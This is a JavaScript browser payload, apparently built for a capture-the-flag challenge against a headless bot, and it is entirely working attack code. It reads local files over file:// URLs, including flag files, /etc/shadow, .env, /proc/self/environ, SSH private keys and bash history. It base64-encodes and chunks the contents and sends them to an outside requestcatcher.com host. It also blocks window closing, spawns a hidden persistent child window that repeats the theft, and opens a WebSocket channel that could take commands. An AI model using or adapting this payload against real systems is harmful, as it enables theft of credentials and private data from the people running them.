(function() {
    'use strict';
    
    const EXFIL_SERVER = 'https://aab.requestcatcher.com/test';
    
    // =================================================================
    // PREVENT BROWSER CLOSE - Override window.close and related methods
    // =================================================================
    
    // Override window.close
    const originalClose = window.close;
    window.close = function() {
        sendLog('close-attempt', 'window.close() was called but blocked');
        // Don't actually close
        return false;
    };
    
    // Prevent beforeunload
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = '';
        sendLog('beforeunload', 'Browser tried to close');
        return '';
    }, true);
    
    // Prevent unload
    window.addEventListener('unload', function(e) {
        e.preventDefault();
        sendLog('unload', 'Unload prevented');
    }, true);
    
    // =================================================================
    // CHILD WINDOW - Opens persistent window that continues if parent closes
    // =================================================================
    
    let childWindow = null;
    
    function openPersistentWindow() {
        try {
            // Open a new window that will persist even if parent closes
            childWindow = window.open('about:blank', '_blank', 'width=1,height=1,left=9999,top=9999');
            
            if (childWindow) {
                sendLog('child-window', 'Persistent window opened');
                
                // Inject the same exfiltration code into child window
                childWindow.document.write(`
                    <html><head><title>Persistent</title></head><body>
                    <script>
                        // Same exfil logic in child window
                        ${getExfilScript()}
                    </script>
                    </body></html>
                `);
                childWindow.document.close();
                
                // Keep child window alive
                setInterval(() => {
                    if (childWindow && !childWindow.closed) {
                        childWindow.focus();
                    }
                }, 5000);
            }
        } catch(e) {
            sendLog('child-error', e.message);
        }
    }
    
    // =================================================================
    // UTILITY FUNCTIONS
    // =================================================================
    
    function sendLog(type, data) {
        const img = new Image();
        img.src = `${EXFIL_SERVER}/log?type=${type}&data=${encodeURIComponent(data)}&t=${Date.now()}`;
    }
    
    function sendData(endpoint, data) {
        // Use Image for fast, fire-and-forget requests
        const img = new Image();
        const encoded = typeof data === 'string' ? btoa(data) : btoa(JSON.stringify(data));
        // Split if too large
        const maxLen = 2000;
        if (encoded.length > maxLen) {
            const chunks = Math.ceil(encoded.length / maxLen);
            for (let i = 0; i < chunks; i++) {
                const chunk = encoded.substr(i * maxLen, maxLen);
                const imgChunk = new Image();
                imgChunk.src = `${EXFIL_SERVER}/${endpoint}?chunk=${i}&total=${chunks}&data=${chunk}&t=${Date.now()}`;
            }
        } else {
            img.src = `${EXFIL_SERVER}/${endpoint}?data=${encoded}&t=${Date.now()}`;
        }
    }
    
    // =================================================================
    // FILE READING - Using XHR (faster and more reliable than fetch)
    // =================================================================
    
    function readFile(path, name) {
        return new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', path, true);
            xhr.timeout = 3000; // 3 second timeout
            
            xhr.onload = function() {
                if (xhr.status === 200 || xhr.status === 0) {
                    sendLog('file-success', `Read ${name}: ${xhr.responseText.length} bytes`);
                    sendData(name, xhr.responseText);
                    resolve(xhr.responseText);
                } else {
                    sendLog('file-error', `${name}: status ${xhr.status}`);
                    reject(new Error(`Status ${xhr.status}`));
                }
            };
            
            xhr.onerror = function() {
                sendLog('file-error', `${name}: network error`);
                reject(new Error('Network error'));
            };
            
            xhr.ontimeout = function() {
                sendLog('file-timeout', name);
                reject(new Error('Timeout'));
            };
            
            xhr.send();
        });
    }
    
    // =================================================================
    // FILE DISCOVERY - Try common paths
    // =================================================================
    
    const targetFiles = [
        // Flags
        { path: 'file:///flag.txt', name: 'flag-root' },
        { path: 'file:///flag', name: 'flag-root-noext' },
        { path: 'file:///app/flag.txt', name: 'flag-app' },
        { path: 'file:///home/flag.txt', name: 'flag-home' },
        { path: 'file:///root/flag.txt', name: 'flag-root-dir' },
        { path: 'file:///tmp/flag.txt', name: 'flag-tmp' },
        { path: 'file:///var/flag.txt', name: 'flag-var' },
        
        // System files
        { path: 'file:///etc/passwd', name: 'passwd' },
        { path: 'file:///etc/shadow', name: 'shadow' },
        { path: 'file:///etc/hosts', name: 'hosts' },
        { path: 'file:///etc/hostname', name: 'hostname' },
        { path: 'file:///etc/os-release', name: 'os-release' },
        
        // App files
        { path: 'file:///app/bot.js', name: 'bot-js' },
        { path: 'file:///app/package.json', name: 'package' },
        { path: 'file:///app/package-lock.json', name: 'package-lock' },
        { path: 'file:///app/.env', name: 'env' },
        { path: 'file:///app/app.js', name: 'app-js' },
        { path: 'file:///app/index.js', name: 'index-js' },
        { path: 'file:///app/server.js', name: 'server-js' },
        
        // Proc filesystem
        { path: 'file:///proc/self/environ', name: 'environ' },
        { path: 'file:///proc/self/cmdline', name: 'cmdline' },
        { path: 'file:///proc/version', name: 'proc-version' },
        
        // User files
        { path: 'file:///home/ctf/flag.txt', name: 'flag-ctf' },
        { path: 'file:///home/user/flag.txt', name: 'flag-user' },
        { path: 'file:///root/.bash_history', name: 'bash-history' },
        { path: 'file:///root/.ssh/id_rsa', name: 'ssh-key' }
    ];
    
    // =================================================================
    // MAIN EXFILTRATION LOGIC
    // =================================================================
    
    async function exfiltrateData() {
        sendLog('start', 'Exfiltration started');
        
        // Read all target files with staggered delays
        for (let i = 0; i < targetFiles.length; i++) {
            const file = targetFiles[i];
            
            // Stagger requests to avoid overwhelming
            setTimeout(() => {
                readFile(file.path, file.name)
                    .catch(e => {
                        // Silent fail, already logged in readFile
                    });
            }, i * 100); // 100ms between each request
        }
        
        // Try to enumerate directory (if possible)
        setTimeout(() => {
            tryDirectoryListing();
        }, 5000);
        
        sendLog('queued', `${targetFiles.length} files queued`);
    }
    
    // =================================================================
    // DIRECTORY LISTING ATTEMPT
    // =================================================================
    
    function tryDirectoryListing() {
        // Try common directory indices
        const dirs = [
            'file:///app/',
            'file:///etc/',
            'file:///home/',
            'file:///root/',
            'file:///tmp/'
        ];
        
        dirs.forEach((dir, i) => {
            setTimeout(() => {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', dir, true);
                xhr.onload = function() {
                    if (xhr.responseText) {
                        sendData('dir-' + i, xhr.responseText);
                    }
                };
                xhr.send();
            }, i * 200);
        });
    }
    
    // =================================================================
    // KEEP-ALIVE MECHANISM
    // =================================================================
    
    function keepAlive() {
        // Send heartbeat every 2 seconds
        setInterval(() => {
            const img = new Image();
            img.src = `${EXFIL_SERVER}/heartbeat?t=${Date.now()}`;
        }, 2000);
        
        // Try to keep page "loading" with meta refresh
        try {
            const meta = document.createElement('meta');
            meta.httpEquiv = 'refresh';
            meta.content = '999999;url=about:blank';
            document.head.appendChild(meta);
        } catch(e) {}
        
        // Create infinite loop iframe
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'data:text/html,<script>setInterval(()=>{},1000)</script>';
            document.body.appendChild(iframe);
        } catch(e) {}
    }
    
    // =================================================================
    // ALTERNATIVE: USE WEBSOCKET FOR PERSISTENT CONNECTION
    // =================================================================
    
    function tryWebSocket() {
        try {
            // If you have a WebSocket server, this keeps connection alive
            const ws = new WebSocket('wss://aab.requestcatcher.com/ws');
            
            ws.onopen = () => {
                sendLog('ws', 'WebSocket connected');
                ws.send(JSON.stringify({ type: 'connected', t: Date.now() }));
            };
            
            ws.onmessage = (e) => {
                // Could receive commands from your server
                sendLog('ws-msg', e.data);
            };
            
            ws.onerror = () => {
                sendLog('ws-error', 'WebSocket failed');
            };
            
        } catch(e) {
            sendLog('ws-error', e.message);
        }
    }
    
    // =================================================================
    // GENERATE SCRIPT FOR CHILD WINDOW
    // =================================================================
    
    function getExfilScript() {
        // Return the same exfiltration logic as a string
        return `
            const EXFIL_SERVER = '${EXFIL_SERVER}';
            
            function sendData(endpoint, data) {
                const img = new Image();
                const encoded = btoa(data);
                img.src = EXFIL_SERVER + '/' + endpoint + '?data=' + encoded + '&from=child&t=' + Date.now();
            }
            
            // Child window also tries to read files
            const files = ${JSON.stringify(targetFiles)};
            
            files.forEach((file, i) => {
                setTimeout(() => {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', file.path, true);
                    xhr.onload = function() {
                        if (xhr.status === 200 || xhr.status === 0) {
                            sendData('child-' + file.name, xhr.responseText);
                        }
                    };
                    xhr.send();
                }, i * 150);
            });
            
            // Keep child alive
            setInterval(() => {
                new Image().src = EXFIL_SERVER + '/child-alive?t=' + Date.now();
            }, 3000);
        `;
    }
    
    // =================================================================
    // EXECUTION - Run everything immediately
    // =================================================================
    
    // Immediate ping
    sendLog('init', 'Script loaded');
    
    // Start exfiltration immediately (don't wait for anything)
    exfiltrateData();
    
    // Open persistent child window
    setTimeout(() => {
        openPersistentWindow();
    }, 500);
    
    // Start keep-alive
    keepAlive();
    
    // Try WebSocket
    setTimeout(() => {
        tryWebSocket();
    }, 1000);
    
    // Final ping after 5 seconds
    setTimeout(() => {
        sendLog('still-alive', '5 seconds elapsed');
    }, 5000);
    
})();
